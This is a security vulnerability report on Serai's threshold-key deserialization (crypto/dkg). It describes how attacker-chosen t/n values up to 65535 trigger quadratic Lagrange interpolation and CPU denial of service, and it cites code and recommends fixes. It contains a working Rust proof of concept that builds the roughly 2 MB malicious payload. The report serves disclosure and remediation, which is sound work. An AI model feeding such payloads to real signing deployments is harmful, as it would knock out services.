### Title
`ThresholdKeys::read` accepts an attacker-controlled `n`/`t` of up to 65535 and computes the group key via a quadratic Lagrange interpolation, causing CPU denial of service - ([File: crypto/dkg/src/lib.rs])

### Summary
The ajv ReDoS class — attacker-controlled input driving a superlinear amount of computation before any validation rejects it — is present in `ThresholdKeys::read`. An unprivileged party that can feed bytes into `ThresholdKeys::read` (the serialization entry point for all DKG-produced key material) controls the `t`/`n` parameters. `ThresholdKeys::new` then derives `group_key` by computing `interpolation_factor` (an O(t) product) once for each of `t` participants: O(t²) field multiplications plus `t` field inversions, all on attacker-chosen `t` up to 65535 (~4.3 billion multiplications). The same quadratic pattern repeats in `ThresholdKeys::view` for every signing session.

### Finding Description
`ThresholdKeys::read` reads `t`, `n`, and `i` as little-endian u16s directly from the reader at crypto/dkg/src/lib.rs:591-602 [1](#0-0) , then reads `n` group elements at crypto/dkg/src/lib.rs:620-623 [2](#0-1) , and finally calls `ThresholdKeys::new`. The only validation is `ThresholdParams::new` (non-zero, `t <= n`, `i <= n`) at crypto/dkg/src/lib.rs:166-179 [3](#0-2)  — there is no upper bound below u16::MAX.

Inside `ThresholdKeys::new`, the group key is computed as `t.iter().map(|i| verification_shares[i] * interpolation.interpolation_factor(*i, &t)).sum()` at crypto/dkg/src/lib.rs:376-378 [4](#0-3) . `Interpolation::interpolation_factor` for `Interpolation::Lagrange` loops over all of `included` performing a numerator/denominator product and a field inversion at crypto/dkg/src/lib.rs:229-247 [5](#0-4) . Computing `group_key` therefore costs t² scalar multiplications and t inversions.

Additionally, every signing session repeats the pattern: `ThresholdKeys::view` calls `interpolation_factor` once per member of `included` (crypto/dkg/src/lib.rs:501-506) [6](#0-5) , and `AlgorithmSignMachine::sign` calls `self.params.keys.view(included)` where `included` is built from the attacker-influenced `preprocesses` map at crypto/frost/src/sign.rs:290-312 [7](#0-6) . With maliciously large `t`/`n`, each signing attempt costs another O(n²) scalar multiplications before any signature share is produced.

### Impact Explanation
A 2 MB input (`n = 65535` serialized Ristretto points plus header) causes ~4.3 billion field multiplications and 65535 inversions purely inside deserialization — blocking the calling thread for orders of magnitude longer than the input's size suggests, analogous to the advisory's single-request CPU denial of service. Worse, the keys deserialize *successfully* and are stored; every subsequent `view()`/`sign()` over the poisoned key set repeats the quadratic work, giving a persistent, repeatable DoS amplifier rather than a one-shot cost. Because the expensive path executes before `ThresholdKeys::new` can return an error, the attacker pays ~2 MB of bandwidth for minutes of victim CPU and a permanently degraded signer set.

### Likelihood Explanation
Reachability is per the stated scope: `ThresholdKeys::read` is an enumerated untrusted-byte sink, and Serai itself serializes/deserializes `ThresholdKeys` for persistence (`ThresholdKeys::serialize`/`read` at crypto/dkg/src/lib.rs:537-632) [8](#0-7) . Any component reading threshold key material from peer-, disk-, or network-originated bytes hits this path. The attacker needs only bytes accepted by the reader — no keys, no collusion, no malformed curves; all points may be valid encodings. Likelihood is bounded only by whether a deployment exposes the reader to untrusted input, which the threat model assumes.

### Recommendation
- Enforce a protocol-meaningful maximum on `t`/`n` inside `ThresholdParams::new` or `ThresholdKeys::read` (e.g., reject `n` above the validator-set cap) before reading `n` points.
- Replace the naive per-participant product with an O(n log n) or O(n) Lagrange evaluation (compute the full numerator product once, divide out each `(share)` factor, and batch-invert the denominators via a single Montgomery-style inversion), eliminating the quadratic term even for legitimate parameter sizes.
- Apply the same optimization to `ThresholdKeys::view`, which recomputes `interpolation_factor` per included signer.

### Proof of Concept
```rust
use std::io;
use frost::{curve::Ristretto, dkg::ThresholdKeys};
use ciphersuite::Ciphersuite;

// Crafted bytes: t = n = 65535, i = 1, Lagrange interpolation
fn attack() {
  let mut buf = vec![];
  // Curve ID header (matches Ristretto's C::ID)
  buf.extend_from_slice(&(Ristretto::ID.len() as u32).to_le_bytes());
  buf.extend_from_slice(Ristretto::ID);
  buf.extend_from_slice(&u16::MAX.to_le_bytes()); // t = 65535
  buf.extend_from_slice(&u16::MAX.to_le_bytes()); // n = 65535
  buf.extend_from_slice(&1u16.to_le_bytes());     // i = 1
  buf.push(1);                                     // Interpolation::Lagrange
  buf.extend_from_slice(&[1u8; 32]);               // secret_share = scalar 1
  let g = Ristretto::generator().to_bytes();
  for _ in 0 .. 65535 { buf.extend_from_slice(g.as_ref()); } // ~2.1 MB

  // ~65535^2 scalar multiplications + 65535 inversions inside ThresholdKeys::new
  let _ = ThresholdKeys::<Ristretto>::read::<&[u8]>(&mut buf.as_slice());
}
```

Each `interpolation_factor` call iterates all 65535 members of `included` (crypto/dkg/src/lib.rs:234-242) [9](#0-8) , and `ThresholdKeys::new` invokes it once per member of `t` (crypto/dkg/src/lib.rs:376-378) — yielding ~4.3 × 10⁹ field multiplications from a single `read` call on a ~2 MB payload, and repeating again in `view()` on every signing attempt against these keys.

### Citations

**File:** crypto/dkg/src/lib.rs (L166-179)
```rust
  pub const fn new(t: u16, n: u16, i: Participant) -> Result<ThresholdParams, DkgError> {
    if (t == 0) || (n == 0) {
      return Err(DkgError::ZeroParameter { t, n });
    }

    if t > n {
      return Err(DkgError::InvalidThreshold { t, n });
    }
    if i.0 > n {
      return Err(DkgError::InvalidParticipant { n, participant: i });
    }

    Ok(ThresholdParams { t, n, i })
  }
```

**File:** crypto/dkg/src/lib.rs (L229-247)
```rust
      Interpolation::Lagrange => {
        let i_f = F::from(u64::from(u16::from(i)));

        let mut num = F::ONE;
        let mut denom = F::ONE;
        for l in included {
          if i == *l {
            continue;
          }

          let share = F::from(u64::from(u16::from(*l)));
          num *= share;
          denom *= share - i_f;
        }

        // Safe as this will only be 0 if we're part of the above loop
        // (which we have an if case to avoid)
        num * denom.invert().unwrap()
      }
```

**File:** crypto/dkg/src/lib.rs (L376-378)
```rust
    let t = (1 ..= params.t()).map(Participant).collect::<Vec<_>>();
    let group_key =
      t.iter().map(|i| verification_shares[i] * interpolation.interpolation_factor(*i, &t)).sum();
```

**File:** crypto/dkg/src/lib.rs (L501-506)
```rust
    for i in &included {
      let verification_share = self.core.verification_shares[i];
      let verification_share = verification_share *
        self.scalar *
        self.core.interpolation.interpolation_factor(*i, &included);
      verification_shares.insert(*i, verification_share);
```

**File:** crypto/dkg/src/lib.rs (L574-632)
```rust
  pub fn read<R: io::Read>(reader: &mut R) -> io::Result<ThresholdKeys<C>> {
    {
      let different = || io::Error::other("deserializing ThresholdKeys for another curve");

      let mut id_len = [0; 4];
      reader.read_exact(&mut id_len)?;
      if u32::try_from(C::ID.len()).unwrap().to_le_bytes() != id_len {
        Err(different())?;
      }

      let mut id = vec![0; C::ID.len()];
      reader.read_exact(&mut id)?;
      if id != C::ID {
        Err(different())?;
      }
    }

    let (t, n, i) = {
      let mut read_u16 = || -> io::Result<u16> {
        let mut value = [0; 2];
        reader.read_exact(&mut value)?;
        Ok(u16::from_le_bytes(value))
      };
      (
        read_u16()?,
        read_u16()?,
        Participant::new(read_u16()?).ok_or(io::Error::other("invalid participant index"))?,
      )
    };

    let mut interpolation = [0];
    reader.read_exact(&mut interpolation)?;
    let interpolation = match interpolation[0] {
      0 => Interpolation::Constant({
        let mut res = Vec::with_capacity(usize::from(n));
        for _ in 0 .. n {
          res.push(C::read_F(reader)?);
        }
        res
      }),
      1 => Interpolation::Lagrange,
      _ => Err(io::Error::other("invalid interpolation method"))?,
    };

    let secret_share = Zeroizing::new(C::read_F(reader)?);

    let mut verification_shares = HashMap::new();
    for l in (1 ..= n).map(Participant) {
      verification_shares.insert(l, <C as Ciphersuite>::read_G(reader)?);
    }

    ThresholdKeys::new(
      ThresholdParams::new(t, n, i).map_err(io::Error::other)?,
      interpolation,
      secret_share,
      verification_shares,
    )
    .map_err(io::Error::other)
  }
```

**File:** crypto/frost/src/sign.rs (L290-312)
```rust
    let mut included = Vec::with_capacity(preprocesses.len() + 1);
    included.push(multisig_params.i());
    for l in preprocesses.keys() {
      included.push(*l);
    }
    included.sort_unstable();

    // Included < threshold
    if included.len() < usize::from(multisig_params.t()) {
      Err(FrostError::InvalidSigningSet("not enough signers"))?;
    }
    // OOB index
    if u16::from(included[included.len() - 1]) > multisig_params.n() {
      Err(FrostError::InvalidParticipant(multisig_params.n(), included[included.len() - 1]))?;
    }
    // Same signer included multiple times
    for i in 0 .. (included.len() - 1) {
      if included[i] == included[i + 1] {
        Err(FrostError::DuplicatedParticipant(included[i]))?;
      }
    }

    let view = self.params.keys.view(included.clone()).unwrap();
```
